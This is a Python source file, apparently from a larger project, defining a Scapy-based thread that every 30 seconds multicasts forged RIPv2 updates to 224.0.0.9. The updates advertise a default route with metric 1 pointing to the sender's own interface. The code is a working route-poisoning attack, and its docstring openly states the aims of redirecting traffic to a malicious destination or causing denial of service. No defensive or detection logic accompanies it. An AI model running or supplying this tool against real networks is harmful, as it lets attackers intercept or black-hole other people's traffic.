from scapy.all import *
from scapy.layers.inet import IP, UDP
from scapy.layers.rip import RIP, RIPEntry
from utils.utils import create_logger
from threading import Thread
from typing import override
import logging
import time

class MalliciousRIPSender(Thread):
    DESTINATION_IP = "224.0.0.9"
    DESTINATION_PORT = 520

    def __init__(self, configuration_path: str | None = None, logger: None | logging.Logger = None):
        super().__init__()
        self.configuration_path = configuration_path
        self.logger = logger if logger else create_logger(self.__class__.__name__)

    def send_malicious_rip_update(self):
        """
        This method sends a malicious RIP update to the network. The update contains a route to the destination IP
        address with a very low metric, making it the preferred route for other routers in the network. This can be
        used to redirect traffic to a malicious destination or to create a denial of service attack by advertising a
        non-existent route.
        """
        self.logger.debug("Sending fake RIP update...")

        addr = "0.0.0.0"
        mask = "0.0.0.0"
        iface_ip = get_if_addr(conf.iface)

        rip = RIP(cmd=2, version=2) / RIPEntry(
            addr=addr,
            mask=mask,
            nextHop=iface_ip,
            metric=1,
        )
        rip_packet = IP(dst=self.DESTINATION_IP) / UDP(sport=self.DESTINATION_PORT, dport=self.DESTINATION_PORT) / rip
        send(rip_packet)

    def send_periodic_updates(self):
        """
        This method will be called when the thread starts. It will continuously send fake RIP updates every 30 seconds.
        """
        while True:
            self.send_malicious_rip_update()
            time.sleep(30)

    @override
    def run(self):
        self.logger.debug("Starting malicious RIP sender thread...")
        self.send_periodic_updates()
